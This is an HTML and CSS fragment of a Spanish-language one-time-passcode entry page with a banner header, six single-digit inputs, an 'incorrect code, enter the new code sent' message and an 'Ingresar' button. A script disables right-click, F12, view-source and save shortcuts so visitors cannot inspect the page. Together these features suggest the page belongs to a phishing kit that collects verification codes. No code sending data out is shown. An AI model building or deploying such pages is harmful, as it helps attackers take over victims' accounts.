<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    background:#efefef;
    min-height:100vh;
}

.header{
    width:100%;
    background:#0d5788;
    display:flex;
    justify-content:center;
    align-items:center;
}

.header-banner{
    display:block;
    width:100%;
    max-width:828px;
    height:auto;
    object-fit:contain;
}

.container{
    display:flex;
    justify-content:center;
    padding:20px;
}

.login-box{
    width:100%;
    max-width:420px;
}

.title{
    text-align:center;
    color:#0b78c8;
    font-size:30px;
    font-weight:600;
    margin:20px 0 30px;
}

.code-label{
    text-align:center;
    color:#444;
    margin-bottom:15px;
    font-size:15px;
}

.otp-container{
    display:flex;
    justify-content:center;
    gap:10px;
    margin-bottom:25px;
}

.otp{
    width:55px;
    height:55px;
    border:1px solid #4b9de3;
    border-radius:6px;
    text-align:center;
    font-size:26px;
    font-weight:bold;
    background:#fff;
    outline:none;
    padding:0;
}

.otp:focus{
    border:2px solid #0b78c8;
}

.btn{
    width:100%;
    height:48px;
    border:none;
    border-radius:30px;
    background:#0b6db8;
    color:white;
    font-size:15px;
    cursor:pointer;
}

@media(max-width:480px){

    .title{
        font-size:22px;
    }

    .otp{
        width:42px;
        height:42px;
        font-size:20px;
    }

    .otp-container{
        gap:5px;
    }
}
</style>

<script> 
    // Bloquear clic derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // Bloquear F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
    document.onkeydown = function(e) {
        if (
            e.keyCode == 123 || // F12
            (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
            (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || // Ctrl+U
            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) // Ctrl+S
        ) {
            e.preventDefault();
            return false;
        }
    }
</script>

</head>

        <div class="code-label">

        </div>

<p style="text-align: center;"><span style="color: #ff0000;">Codigo incorrecto validar un nuevo codigo enviado</span></p>
<br>

<div class="inputs">

        <div class="otp-container">
            <input type="tel" id="pedido11"   maxlength="1" class="otp"required>
            <input type="tel" id="pedido12"   maxlength="1" class="otp"required>
            <input type="tel" id="pedido13"   maxlength="1" class="otp"required>
            <input type="tel" id="pedido14"   maxlength="1" class="otp"required>
            <input type="tel" id="pedido15"   maxlength="1" class="otp"required>
            <input type="tel" id="pedido16"   maxlength="1" class="otp"required>

 
 
        </div>


        <button class="btn">Ingresar</button>

    </div>
